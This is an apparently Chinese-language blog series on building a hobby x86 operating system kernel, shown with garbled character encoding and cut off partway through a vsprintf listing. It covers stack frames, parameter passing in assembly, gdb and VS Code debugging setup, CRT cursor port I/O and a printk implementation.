-mpreferred-stack-boundary=2ï¼šå–æ¶ˆæ ˆå¯¹é½ æ ˆå¸§ 123456pushl %ebpmovl %esp, %ebp...leave ;ç­‰æ•ˆäº ;mov %ebp, %esp ;pop %ebp -fomit-frame-pointerï¼šå»æ‰æ ˆå¸§ æœ€åå‰©ä¸‹çš„ 123456789101112131415161718192021 .file &quot;hello.c&quot; ;æ–‡ä»¶å .text ;ä»£ç æ®µ .globl message ;å°†messageå¯¼å‡º .data ;æ•°æ®æ®µ .align 4 ;æŒ‰4å­—èŠ‚å¯¹é½ .type message, @object;ç±»å‹ .size message, 13 ;å°ºå¯¸message: .string &quot;hello world\\n&quot; .comm buf,1024,32 .text ;ä»£ç æ®µ .globl main ;mainå‡½æ•° .type main, @functionmain: pushl $message ;&amp;messageå‹å…¥æ ˆä¸­ call puts addl $4, %esp ;æ¢å¤æ ˆ movl $0, %eax ;å‡½æ•°è¿”å›å€¼ï¼Œå­˜å‚¨åœ¨eaxä¸­ ret ;å‡½æ•°è°ƒç”¨è¿”å› .size main, .-main ;mainå‡½æ•°å°ºå¯¸ .section .note.GNU-stack,&quot;&quot;,@progbits ;æ ‡åŠæ ˆä¸å¯è¿è¡Œï¼ŒNXä¿æŠ¤ vscodeä¸­è°ƒè¯•æ±‡ç¼– åœ¨è®¾ç½®é‡Œé¢æœç´¢breakï¼Œæ‰“å¼€å…è®¸æ‰€æœ‰æ–‡ä»¶æ–­ç‚¹ åœ¨task.jsonä¸­ â€œtypeâ€: â€œshellâ€ ![](https://img.joe1sn.top/uploads/big/dbc59407db30d4cf22704e34ea41cfc3.png æ“ä½œç³»ç»Ÿå®ç°-å †æ ˆ/å‡½æ•°/å˜é‡/ä¼ å‚ å †æ ˆå’Œå‡½æ•° å…¶å®ä¹‹å‰CTFé‡Œé¢çš„æ–‡ç« è®²è¿‡ä¸€äº›äº† https://blog.joe1sn.top/2021/01/16/heap_learning_part0-å †åŸºç¡€/ æ ˆï¼šæ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„æ•°æ®ç»“æ„ï¼Œç‰¹å¾ï¼šåè¿›å…ˆå‡º å †æ ˆæ˜¯ä¸€å—å†…å­˜åŒºåŸŸ æ ˆé¡¶æŒ‡é’ˆæ˜¯åœ¨ss:espå¯„å­˜å™¨ä¸­ï¼Œæ ˆåº•åœ¨é«˜åœ°å€ï¼Œå‘ä¸‹å¢é•¿ åˆ›å»ºsrc/test/call.asm 12345678[bits 32]extern exitglobal mainmain: push 0 ;ä¼ é€’å‚æ•° call exit åœ¨src/.vscode/launch.jsonæ·»åŠ è°ƒè¯•å‚æ•°ä½¿ç”¨NASMæ±‡ç¼–æ ¼å¼ 123456789101112131415161718192021222324252627&#123; &quot;name&quot;: &quot;NASM Build Debugger&quot;, &quot;type&quot;: &quot;cppdbg&quot;, &quot;request&quot;: &quot;launch&quot;, // &quot;program&quot;: &quot;$&#123;workspaceFolder&#125;/build/kernel.bin&quot;, &quot;program&quot;: &quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.out&quot;, &quot;args&quot;: [], &quot;stopAtEntry&quot;: false, &quot;cwd&quot;: &quot;$&#123;fileDirname&#125;&quot;, &quot;environment&quot;: [], &quot;externalConsole&quot;: false, &quot;MIMode&quot;: &quot;gdb&quot;, &quot;setupCommands&quot;: [ &#123; &quot;description&quot;: &quot;ä¸º gdb å¯ç”¨æ•´é½æ‰“å°&quot;, &quot;text&quot;: &quot;-enable-pretty-printing&quot;, &quot;ignoreFailures&quot;: true &#125;, &#123; &quot;description&quot;: &quot;å°†åæ±‡ç¼–é£æ ¼è®¾ç½®ä¸º Intel&quot;, &quot;text&quot;: &quot;-gdb-set disassembly-flavor intel&quot;, &quot;ignoreFailures&quot;: true &#125; ], &quot;preLaunchTask&quot;: &quot;NASM Build Debugger&quot;, &quot;miDebuggerPath&quot;: &quot;/usr/bin/gdb&quot;&#125; ä¿®æ”¹./.vscode/task.jsonæ·»åŠ å¦‚ä¸‹é…ç½® 1234567891011121314151617181920212223242526272829303132333435&#123; &quot;type&quot;: &quot;shell&quot;, &quot;label&quot;: &quot;NASM Build Debugger&quot;, &quot;command&quot;: &quot;&quot;, &quot;args&quot;: [ &quot;/usr/bin/nasm&quot;, &quot;-f&quot;, &quot;elf32&quot;, &quot;-g&quot;, &quot;$&#123;file&#125;&quot;, &quot;-o&quot;, &quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.o&quot;, &quot;;&quot;, &quot;/usr/bin/gcc&quot;, &quot;-fdiagnostics-color=always&quot;, &quot;-m32&quot;, //32 ä½ç¨‹åº &quot;-g&quot;, &quot;-static&quot;, &quot;-I$&#123;workspaceFolder&#125;/src/include&quot;, &quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.o&quot;, &quot;-o&quot;, &quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.out&quot; ], &quot;options&quot;: &#123; &quot;cwd&quot;: &quot;$&#123;fileDirname&#125;&quot; &#125;, &quot;problemMatcher&quot;: [ &quot;$gcc&quot; ], &quot;group&quot;: &#123; &quot;kind&quot;: &quot;build&quot;, &quot;isDefault&quot;: true &#125;, &quot;detail&quot;: &quot;è°ƒè¯•å™¨ç”Ÿæˆçš„ä»»åŠ¡ã€‚&quot; &#125; 32ä½æ±‡ç¼–åˆ°objectå†ç”¨gccåˆ°elf.outï¼Œè°ƒè¯•è¡¨ä¸¢å¤± æˆ‘ç”¨åŒæ ·çš„æ–¹æ³•è¯•äº†ä¸€ä¸ª32ä½çš„helloworldï¼Œä¹Ÿæ˜¯æ— æ³•è°ƒè¯•ï¼Œobjdumpçœ‹æœ‰file line addrä¿¡æ¯ï¼Œgdbä¹Ÿæ˜¯which has no line number infomationï¼Œç„¶åvscodeè°ƒè¯•çš„æ—¶å€™å¤šä¸‹å‡ ä¸ªæ–­ç‚¹æ‰èƒ½èµ·åˆ°æ•ˆæœ.å¾ˆçƒ¦äºº æ‰€ä»¥è¿™é‡Œæˆ‘ç›´æ¥çŒ›ä¸‹æ–­ç‚¹ ç»è¿‡ç¼–è¯‘ä¸é“¾æ¥ï¼Œæœ€ç»ˆçš„elfæ–‡ä»¶å¦‚ä¸‹ åœ¨è°ƒè¯•æ§åˆ¶å°ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹æ ˆä¿¡æ¯ 1-exec display/8xw $sp ï¼ˆå›¾ç‰‡è¢«å¤„ç†è¿‡ï¼‰å¯ä»¥çœ‹åˆ°æ ˆçš„ç”Ÿé•¿æ–¹å‘ï¼Œè¿˜æœ‰ç›¸å…³çš„ä¸€äº›å€¼ pushï¼šå…¥æ ˆ popï¼šå‡ºæ ˆ pushaï¼šå‹å…¥8ä¸ªå¯„å­˜å™¨ popaï¼šå¼¹å‡º7ä¸ªå¯„å­˜å™¨ï¼Œå¿½ç•¥esp å‡½æ•° callï¼šå‡½æ•°è¿”å›çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„è¿”å›åœ°å€å‹å…¥æ ˆ retï¼šæ ˆé¡¶å¼¹å‡ºåˆ°EIP callä¸retæ— å…³ å˜é‡ä¸ä¼ å‚ æ–°å»ºsrc/test/param.c 12345678910111213int add(int x,int y)&#123; int z = x + y; return z;&#125;int main()&#123; int a = 5; int b = 3; int c = add(a,b); return 0;&#125; å†™makefile 123.PHONY: param.sparam.s: param.c gcc $(CFLAGS) -S $&lt; -o $@ æœ€åç”Ÿæˆçš„src/test/param.asm 123456789101112131415161718192021222324252627282930313233343536373839 .file &quot;param.c&quot; .text .globl add .type add, @functionadd: pushl %ebp movl %esp, %ebp subl $4, %esp ;ä¸€ä¸ªå±€éƒ¨å˜é‡ movl 8(%ebp), %edx ;a movl 12(%ebp), %eax ;b addl %edx, %eax ;ç›¸åŠ ï¼Œeax+=edx movl %eax, -4(%ebp) ;z = x + y movl -4(%ebp), %eax ;eax = z leave ret .size add, .-add .globl main .type main, @functionmain: pushl %ebp movl %esp, %ebp ;ä¿å­˜æ ˆå¸§ subl $12, %esp ;ä¿å­˜12å­—èŠ‚ï¼ŒåŠ3ä¸ªå±€éƒ¨å˜é‡ movl $5, -12(%ebp);a movl $3, -8(%ebp);b ;-----------------------------32ä½ä¼ å‚å‡†å¤‡ pushl -8(%ebp) ;b pushl -12(%ebp) ;a call add addl $8, %esp ;espæ¢å¤ movl %eax, -4(%ebp);c=add(a,b) movl $0, %eax ;è¿”å›å€¼å­˜å‚¨åœ¨eaxä¸­(return 0) leave ;å›å¤æ ˆå¸§ ret .size main, .-main .section .note.GNU-stack,&quot;&quot;,@progbits 64ä½ï¼šå¯„å­˜å™¨ä¼ å‚ 32ä½ï¼šæ ˆä¼ å‚ å–æ¶ˆæ ˆå¸§ 123456789101112131415161718192021222324252627282930 .file &quot;param.c&quot; .text .globl add .type add, @functionadd: subl $4, %esp movl 8(%esp), %edx movl 12(%esp), %eax addl %edx, %eax movl %eax, (%esp) movl (%esp), %eax addl $4, %esp ret .size add, .-add .globl main .type main, @functionmain: subl $12, %esp movl $5, (%esp) movl $3, 4(%esp) pushl 4(%esp) pushl 4(%esp) call add addl $8, %esp movl %eax, 8(%esp) movl $0, %eax addl $12, %esp ret .size main, .-main .section .note.GNU-stack,&quot;&quot;,@progbits å †ï¼šhttps://blog.joe1sn.top/2021/01/16/heap_learning_part0-å †åŸºç¡€/ æ“ä½œç³»ç»Ÿå®ç°-IOä¸å­—ç¬¦ä¸²å¤„ç† ä»£ç æ¥æºï¼šhttps://github.com/StevenBaby/onix ç›¸å…³è¯¾ç¨‹ï¼šhttps://www.bilibili.com/video/BV1gR4y1u7or æ„Ÿè°¢Bç«™UPï¼šè¸Œèº‡æœˆå…‰ å¸¦æ¥çš„ç›¸å…³ä»£ç å’Œæ•™ç¨‹ Input/Output å‚è€ƒä¹‹å‰çš„ç¡¬ç›˜è¯»å†™ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦å¯¹ä¸€äº›ç«¯å£è¿›è¡Œæ“ä½œ CRTï¼šé˜´æå°„çº¿ç®¡ åœ°å€å¯„å­˜å™¨ï¼š0x3D4 æ•°æ®å¯„å­˜å™¨ï¼š0x3D5 å…‰æ ‡ä½ç½®ï¼šé«˜ä½0xE å…‰æ ‡ä½ç½®ï¼šé«˜ä½0xF src/include/xsys/io.h 123456789101112#ifndef XSYS_IO_H#define XSYS_IO_H#include &lt;xsys/types.h&gt;extern u8 inb(u16 port); //è¾“å…¥ä¸€ä¸ªå­—èŠ‚extern u16 inw(u16 port); //è¾“å…¥ä¸€ä¸ªå­—extern void inb(u16 port, u8 value); //è¾“å‡ºä¸€ä¸ªå­—èŠ‚extern void inw(u16 port, u16 value); //è¾“å‡ºä¸€ä¸ªå­—#endif src/kernel/io.asm 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566[bits 32]section .text; ä»£ç æ®µglobal inb ; å°† inb å¯¼å‡ºinb: push ebp; mov ebp, esp ; ä¿å­˜å¸§ xor eax, eax ; å°† eax æ¸…ç©º mov edx, [ebp + 8]; port in al, dx; å°†ç«¯å£å· dx çš„ 8 bit è¾“å…¥åˆ° al jmp $+2 ; ä¸€ç‚¹ç‚¹å»¶è¿Ÿ jmp $+2 ; ä¸€ç‚¹ç‚¹å»¶è¿Ÿ jmp $+2 ; ä¸€ç‚¹ç‚¹å»¶è¿Ÿ leave ; æ¢å¤æ ˆå¸§ retglobal outboutb: push ebp; mov ebp, esp ; ä¿å­˜å¸§ mov edx, [ebp + 8]; port mov eax, [ebp + 12]; value out dx, al; å°† al ä¸­çš„ 8 bit è¾“å…¥å‡ºåˆ° ç«¯å£å· dx jmp $+2 ; ä¸€ç‚¹ç‚¹å»¶è¿Ÿ jmp $+2 ; ä¸€ç‚¹ç‚¹å»¶è¿Ÿ jmp $+2 ; ä¸€ç‚¹ç‚¹å»¶è¿Ÿ leave ; æ¢å¤æ ˆå¸§ retglobal inwinw: push ebp; mov ebp, esp ; ä¿å­˜å¸§ xor eax, eax ; å°† eax æ¸…ç©º mov edx, [ebp + 8]; port in ax, dx; å°†ç«¯å£å· dx çš„ 16 bit è¾“å…¥åˆ° ax jmp $+2 ; ä¸€ç‚¹ç‚¹å»¶è¿Ÿ jmp $+2 ; ä¸€ç‚¹ç‚¹å»¶è¿Ÿ jmp $+2 ; ä¸€ç‚¹ç‚¹å»¶è¿Ÿ leave ; æ¢å¤æ ˆå¸§ retglobal outwoutw: push ebp ; mov ebp, esp ; ä¿å­˜å¸§ mov edx, [ebp + 8]; port mov eax, [ebp + 12]; value out dx, ax; å°† ax ä¸­çš„ 16 bit è¾“å…¥å‡ºåˆ° ç«¯å£å· dx jmp $+2 ; ä¸€ç‚¹ç‚¹å»¶è¿Ÿ jmp $+2 ; ä¸€ç‚¹ç‚¹å»¶è¿Ÿ jmp $+2 ; ä¸€ç‚¹ç‚¹å»¶è¿Ÿ leave ; æ¢å¤æ ˆå¸§ ret src/kernel/main.c 1234567891011121314151617181920212223242526#include &lt;xsys/xsys.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/io.h&gt;#define CRT_ADDR_REG 0x3d4#define CRT_DATA_REG 0x3d5#define CRT_CURSOR_H 0xeu#define CRT_CURSOR_L 0xfvoid kernel_init()&#123; //è·å¾—å½“å‰å…‰æ ‡åæ ‡ outb(CRT_ADDR_REG,CRT_CURSOR_H); //å°†é«˜ä½å¯¼å‡ºåˆ°åœ°å€ç«¯å£ u16 pos = inb(CRT_DATA_REG) &lt;&lt; 8; //ç§»åˆ°posé«˜ä½ outb(CRT_ADDR_REG,CRT_CURSOR_L); //å°†ä½ä½å¯¼å‡ºåˆ°åœ°å€ç«¯å£ pos |= inb(CRT_DATA_REG); //ç§»åˆ°posä½ä½ //ä¿®æ”¹å½“å‰å…‰æ ‡åæ ‡ outb(CRT_ADDR_REG,CRT_CURSOR_H); outb(CRT_DATA_REG,0); outb(CRT_ADDR_REG,CRT_CURSOR_L); outb(CRT_DATA_REG,1); return;&#125; src/makefile æ·»åŠ io.oä¾èµ– 1234567$(BUILD)/kernel.bin: \\ $(BUILD)/kernel/start.o \\ $(BUILD)/kernel/main.o \\ $(BUILD)/kernel/io.o $(shell mkdir -p $(dir $@)) ld -g -m elf_i386 -static $^ -o $@ -Ttext $(ENTRYPOINT) å…³äºè°ƒè¯• æˆ‘åœ¨ç½‘ä¸Šæ‰¾äº†ä¸€åœˆï¼Œå®åœ¨æ˜¯æ²¡æœ‰æ‰¾åˆ°åƒè§†é¢‘ä¸­çš„æ•ˆæœï¼Œæ‰€ä»¥å»ºè®®ä½¿ç”¨gdbè°ƒè¯•æ±‡ç¼–ç›¸å…³ é¦–å…ˆè°ƒè¯•è·å¾—å…‰æ ‡ï¼Œè¿™é‡ŒåŸºæœ¬è¦è§‚å¯Ÿçš„å˜é‡åœ¨Cè¯­è¨€ä¸­ï¼Œå¯ä»¥è¯•ç€ä½¿ç”¨vscodeè¿œç¨‹è°ƒè¯• â€‹ æœ€åçš„å¾—åˆ°å€¼æ˜¯ï¼š240ï¼Œbin(240)=11110000bin(240)=11110000bin(240)=11110000ï¼Œæ‰€ä»¥é«˜ä½æ˜¯1111ï¼Œåœ°ä½æ˜¯0000 240=3âˆ—80240=3*80240=3âˆ—80ï¼Œåˆšå¥½ä¹Ÿæ˜¯ç¬¬å››è¡Œç¬¬ä¸€ä¸ª æ¥ç€ä¿®æ”¹å…‰æ ‡ä½ç½® å…¶å®æˆ‘ä»¬å¯ä»¥ç®—å‡ºåæ ‡çš„å€¼ï¼š000000001ï¼Œæˆ‘ä»¬å¯ä»¥éªŒè¯ä¸‹ å­—ç¬¦ä¸²å¤„ç† æœ‰ #include &lt;string.h&gt; åŒæ—¶å¯ä»¥ä½¿ç”¨æ±‡ç¼–æˆ–ç­‰æ›´é«˜æ•ˆçš„å®ç° å‚è€ƒ https://www.bilibili.com/video/BV1zL4y1s76t/?spm_id_from=333.788 https://www.osdever.net/FreeVGA/home.htm http://www.osdever.net/FreeVGA/vga/crtcreg.htm æ“ä½œç³»ç»Ÿå®ç°-å¤šå‚æ•°ä¸printkå®ç° printfçš„å¤šå‚æ•°åŸç† printkè¿™ä¸ªå‡½æ•°å®åœ¨æ“ä½œç³»ç»Ÿå†…æ ¸é‡Œé¢å®ç°çš„ï¼Œä¸€èˆ¬åœ¨ç”¨æˆ·æ€ä¸­æ˜¯printfï¼Œä¸¤è€…åŸç†ä¸Šå·®ä¸å¤š é¦–å…ˆçœ‹printfçš„å¤šå‚æ•°å®ç° åœ¨Linuxæºä»£ç ä¸­ï¼Œprintfæ˜¯è¿™æ ·å†™çš„ /arch/x86/boot/printf.c 1234567891011121314int printf(const char *fmt, ...)&#123; char printf_buf[1024]; va_list args; int printed; va_start(args, fmt); printed = vsprintf(printf_buf, fmt, args); va_end(args); puts(printf_buf); return printed;&#125; å…¶ä¸­çš„å˜é‡ç±»å‹ va_listã€va_startã€va_endå®šä¹‰å¦‚ä¸‹ /include/linux/stdarg.h 1234567891011#ifndef _LINUX_STDARG_H#define _LINUX_STDARG_Htypedef __builtin_va_list va_list;#define va_start(v, l) __builtin_va_start(v, l)#define va_end(v) __builtin_va_end(v)#define va_arg(v, T) __builtin_va_arg(v, T)#define va_copy(d, s) __builtin_va_copy(d, s)#endif gcc/x86_64-linux-gnu/7/include/stdarg.hä¸­ï¼Œæœ‰ 1234#ifndef __GNUC_VA_LIST#define __GNUC_VA_LISTtypedef __builtin_va_list __gnuc_va_list;#endif é€šè¿‡æŸ¥é˜…gccçš„æºä»£ç ä½ ä¼šå‘ç°æœ€åŸå§‹çš„åŠŸèƒ½å®ç°è¢«æ”¹è¿›äº†å¾ˆå¤šï¼Œå…¶å®å¯ä»¥ç¿»è¯‘ä¸º 12345678910#ifndef XSYS_STDARG_H#define XSYS_STDARG_Htypedef char* va_list;#define va_start(ap, v) (ap = (va_list)&amp;v + sizeof(char*) )#define va_arg(ap, t) (* (t*)(ap+=sizeof(char*)-sizeof(char*)) )#define va_end(ap) (ap = (va_list)0)#endif va_start(ap, v)ï¼šapä¸º vï¼ˆä¸€ä¸ªva_listï¼‰çš„å¼€å§‹æ ¼å¼åŒ–å­—ç¬¦ä¸² va_arg(ap, t)ï¼štä¸ºå½“å‰æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œapä¸ºä¸‹ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸² æ³¨ï¼šap+=sizeof(char*)-sizeof(char*)è¿™æ—¶å·²ç»ap=ap+sizeof(char *)äº† va_end(ap)ï¼šè®©æ ¼å¼åŒ–å­—ç¬¦ä¸²ç½®é›¶ åˆ™æˆ‘ä»¬å¯ä»¥æœ‰printkå®ç° printkå®ç° src/kernel/printk.c 12345678910111213141516171819#include &lt;xsys/stdarg.h&gt;#include &lt;xsys/stdio.h&gt;#include &lt;xsys/console.h&gt;static char buf[1024];int printk(const char *fmt, ...)&#123; va_list args; int i; va_start(args, fmt); i = vsprintf(buf, fmt, args); va_end(args); console_write(buf, i); return i;&#125; src/lib/vsprintf.c è¿™é‡Œå¯ä»¥å–å·§æŠ„linuxçš„æºä»£ç ï¼šhttps://elixir.bootlin.com/linux/latest/source/arch/x86/boot/printf.c#L113 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381#include &lt;xsys/stdarg.h&gt;#include &lt;xsys/string.h&gt;#define ZEROPAD 1 // å¡«å……é›¶#define SIGN 2 // unsigned/signed long#define PLUS 4 // æ˜¾ç¤ºåŠ #define SPACE 8 // å¦‚æ˜¯åŠ ï¼Œåˆ™ç½®ç©ºæ ¼#define LEFT 16 // å·¦è°ƒæ•´#define SPECIAL 32 // 0x#define SMALL 64 // ä½¿ç”¨å°å†™å­—æ¯#define is_digit(c) ((c) &gt;= &#x27;0&#x27; &amp;&amp; (c) &lt;= &#x27;9&#x27;)// å°†å­—ç¬¦æ•°å­—ä¸²è½¬æ¢æˆæ•´æ•°ï¼Œå¹¶å°†æŒ‡é’ˆå‰ç§»static int skip_atoi(const char **s)&#123; int i = 0; while (is_digit(**s)) i = i * 10 + *((*s)++) - &#x27;0&#x27;; return i;&#125;// å°†æ•´æ•°è½¬æ¢ä¸ºæŒ‡å®šè¿›åˆ¶çš„å­—ç¬¦ä¸²// str - è¾“å‡ºå­—ç¬¦ä¸²æŒ‡é’ˆ// num - æ•´æ•°// base - è¿›åˆ¶åŸºæ•°// size - å­—ç¬¦ä¸²é•¿åº¦// precision - æ•°å­—é•¿åº¦(ç²¾åº¦)// flags - é€‰é¡¹static char *number(char *str, unsigned long num, int base, int size, int precision, int flags)&#123; char c, sign, tmp[36]; const char *digits = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; int i; int index; char *ptr = str; // å¦‚æœ flags æŒ‡å‡ºç”¨å°å†™å­—æ¯ï¼Œåˆ™å®šä¹‰å°å†™å­—æ¯é›† if (flags &amp; SMALL) digits = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;; // å¦‚æœ flags æŒ‡å‡ºè¦å·¦å¯¹é½ï¼Œåˆ™å±è”½ç±»å‹ä¸­çš„å¡«é›¶æ ‡å¿— if (flags &amp; LEFT) flags &amp;= ~ZEROPAD; // å¦‚æœè¿›åˆ¶åŸºæ•°å°äº 2 æˆ–å¤§äº 36ï¼Œåˆ™é€€å‡ºå¤„ç† // ä¹Ÿå³æœ¬ç¨‹åºåªèƒ½å¤„ç†åŸºæ•°åœ¨ 2-32 ä¹‹é—´çš„æ•° if (base &lt; 2 || base &gt; 36) return 0; // å¦‚æœ flags æŒ‡å‡ºè¦å¡«é›¶ï¼Œåˆ™ç½®å­—ç¬¦å˜é‡ c=&#x27;0&#x27;ï¼Œå¦åˆ™ c ç­‰äºç©ºæ ¼å­—ç¬¦ c = (flags &amp; ZEROPAD) ? &#x27;0&#x27; : &#x27; &#x27;; // å¦‚æœ flags æŒ‡å‡ºæ˜¯å¸¦ç¬¦å·æ•°å¹¶ä¸”æ•°å€¼ num å°äº 0ï¼Œåˆ™ç½®ç¬¦å·å˜é‡ sign=è´Ÿå·ï¼Œå¹¶ä½¿ num å–ç»å¯¹å€¼ if (flags &amp; SIGN &amp;&amp; num &lt; 0) &#123; sign = &#x27;-&#x27;; num = -num; &#125; else // å¦åˆ™å¦‚æœ flags æŒ‡å‡ºæ˜¯åŠ å·ï¼Œåˆ™ç½® sign=åŠ å·ï¼Œå¦åˆ™è‹¥ç±»å‹å¸¦ç©ºæ ¼æ ‡å¿—åˆ™ sign=ç©ºæ ¼ï¼Œå¦åˆ™ç½® 0 sign = (flags &amp; PLUS) ? &#x27;+&#x27; : ((flags &amp; SPACE) ? &#x27; &#x27; : 0); // è‹¥å¸¦ç¬¦å·ï¼Œåˆ™å®½åº¦å€¼å‡ 1 if (sign) size--; // è‹¥ flags æŒ‡å‡ºæ˜¯ç‰¹æ®Šè½¬æ¢ï¼Œåˆ™å¯¹äºåå…­è¿›åˆ¶å®½åº¦å†å‡å°‘ 2 ä½(ç”¨äº0x) if (flags &amp; SPECIAL) &#123; if (base == 16) size -= 2; // å¯¹äºå…«è¿›åˆ¶å®½åº¦å‡ 1ï¼ˆç”¨äºå…«è¿›åˆ¶è½¬æ¢ç»“æœå‰æ”¾ä¸€ä¸ªé›¶ï¼‰ else if (base == 8) size--; &#125; i = 0; // å¦‚æœæ•°å€¼ num ä¸º 0ï¼Œåˆ™ä¸´æ—¶å­—ç¬¦ä¸²=&#x27;0&#x27;ï¼›å¦åˆ™æ ¹æ®ç»™å®šçš„åŸºæ•°å°†æ•°å€¼ num è½¬æ¢æˆå­—ç¬¦å½¢å¼ if (num == 0) tmp[i++] = &#x27;0&#x27;; else while (num != 0) &#123; index = num % base; num /= base; tmp[i++] = digits[index]; &#125; // è‹¥æ•°å€¼å­—ç¬¦ä¸ªæ•°å¤§äºç²¾åº¦å€¼ï¼Œåˆ™ç²¾åº¦å€¼æ‰©å±•ä¸ºæ•°å­—ä¸ªæ•°å€¼ if (i &gt; precision) precision = i; // å®½åº¦å€¼ size å‡å»ç”¨äºå­˜æ”¾æ•°å€¼å­—ç¬¦çš„ä¸ªæ•° size -= precision; // ä»è¿™é‡ŒçœŸæ­£å¼€å§‹å½¢æˆæ‰€éœ€è¦çš„è½¬æ¢ç»“æœï¼Œå¹¶æš‚æ—¶æ”¾åœ¨å­—ç¬¦ä¸² str ä¸­ // è‹¥ flags ä¸­æ²¡æœ‰å¡«é›¶(ZEROPAD) å’Œå·¦å¯¹é½ï¼ˆå·¦è°ƒæ•´ï¼‰æ ‡å¿— // åˆ™åœ¨ str ä¸­é¦–å…ˆå¡«æ”¾å‰©ä½™å®½åº¦å€¼æŒ‡å‡ºçš„ç©ºæ ¼æ•° if (!(flags &amp; (ZEROPAD + LEFT))) while (size-- &gt; 0) *str++ = &#x27; &#x27;; // è‹¥éœ€å¸¦ç¬¦å·ä½ï¼Œåˆ™å­˜å…¥ç¬¦å· if (sign) *str++ = sign; // è‹¥ flags æŒ‡å‡ºæ˜¯ç‰¹æ®Šè½¬æ¢ if (flags &amp; SPECIAL) &#123; // åˆ™å¯¹äºå…«è¿›åˆ¶è½¬æ¢ç»“æœå¤´ä¸€ä½æ”¾ç½®ä¸€ä¸ª&#x27;0&#x27; if (base == 8) *str++ = &#x27;0&#x27;; // å¯¹äºåå…­è¿›åˆ¶åˆ™å­˜æ”¾&#x27;0x&#x27; else if (base == 16) &#123; *str++ = &#x27;0&#x27;; *str++ = digits[33]; &#125; &#125; // è‹¥ flags ä¸­æ²¡æœ‰å·¦è°ƒæ•´ï¼ˆå·¦å¯¹é½ï¼‰æ ‡å¿—, åˆ™åœ¨å‰©ä½™å®½åº¦ä¸­å­˜æ”¾ c å­—ç¬¦ï¼ˆ&#x27;0&#x27;æˆ–ç©ºæ ¼ï¼‰ if (!(flags &amp; LEFT)) while (size-- &gt; 0) *str++ = c; // æ­¤æ—¶ i å­˜æœ‰æ•°å€¼ num çš„æ•°å­—ä¸ªæ•° // è‹¥æ•°å­—ä¸ªæ•°å°äºç²¾åº¦å€¼ï¼Œåˆ™ str ä¸­æ”¾å…¥ï¼ˆç²¾åº¦å€¼-iï¼‰ä¸ª&#x27;0&#x27; while (i &lt; precision--) *str++ = &#x27;0&#x27;; // å°†è½¬æ•°å€¼æ¢å¥½çš„æ•°å­—å­—ç¬¦å¡«å…¥ str ä¸­ï¼Œå…± i ä¸ª while (i-- &gt; 0) *str++ = tmp[i]; // è‹¥å®½åº¦å€¼ä»å¤§äºé›¶ // åˆ™è¡¨ç¤º flags æ ‡å¿—ä¸­æœ‰å·¦å¯¹é½æ ‡å¿—æ ‡å¿— // åˆ™åœ¨å‰©ä½™å®½åº¦ä¸­æ”¾å…¥ç©ºæ ¼ while (size-- &gt; 0) *str++ = &#x27; &#x27;; return str;&#125;int vsprintf(char *buf, const char *fmt, va_list args)&#123; int len; int i; // ç”¨äºå­˜æ”¾è½¬æ¢è¿‡ç¨‹ä¸­çš„å­—ç¬¦ä¸² char *str; char *s; int *ip; // number() å‡½æ•°ä½¿ç”¨çš„æ ‡å¿— int flags; int field_width; // è¾“å‡ºå­—æ®µå®½åº¦ int precision; // min æ•´æ•°æ•°å­—ä¸ªæ•°ï¼›max å­—ç¬¦ä¸²ä¸­å­—ç¬¦ä¸ªæ•° int qualifier; // &#x27;h&#x27;, &#x27;l&#x27; æˆ– &#x27;L&#x27; ç”¨äºæ•´æ•°å­—æ®µ // é¦–å…ˆå°†å­—ç¬¦æŒ‡é’ˆæŒ‡å‘ buf // ç„¶åæ‰«ææ ¼å¼å­—ç¬¦ä¸²ï¼Œ // å¯¹å„ä¸ªæ ¼å¼è½¬æ¢æŒ‡ç¤ºè¿›è¡Œç›¸åº”çš„å¤„ç† for (str = buf; *fmt; ++fmt) &#123; // æ ¼å¼è½¬æ¢æŒ‡ç¤ºå­—ç¬¦ä¸²å‡ä»¥ &#x27;%&#x27; å¼€å§‹ // è¿™é‡Œä» fmt æ ¼å¼å­—ç¬¦ä¸²ä¸­æ‰«æ &#x27;%&#x27;ï¼Œå¯»æ‰¾æ ¼å¼è½¬æ¢å­—ç¬¦ä¸²çš„å¼€å§‹ // ä¸æ˜¯æ ¼å¼æŒ‡ç¤ºçš„ä¸€èˆ¬å­—ç¬¦å‡è¢«ä¾æ¬¡å­˜å…¥ str if (*fmt != &#x27;%&#x27;) &#123; *str++ = *fmt; continue; &#125; // ä¸‹é¢å–å¾—æ ¼å¼æŒ‡ç¤ºå­—ç¬¦ä¸²ä¸­çš„æ ‡å¿—åŸŸï¼Œå¹¶å°†æ ‡å¿—å¸¸é‡æ”¾å…¥ flags å˜é‡ä¸­ flags = 0; repeat: // æ‰è¿‡ç¬¬ä¸€ä¸ª % ++fmt; switch (*fmt) &#123; // å·¦å¯¹é½è°ƒæ•´ case &#x27;-&#x27;: flags |= LEFT; goto repeat; // æ”¾åŠ å· case &#x27;+&#x27;: flags |= PLUS; goto repeat; // æ”¾ç©ºæ ¼ case &#x27; &#x27;: flags |= SPACE; goto repeat; // 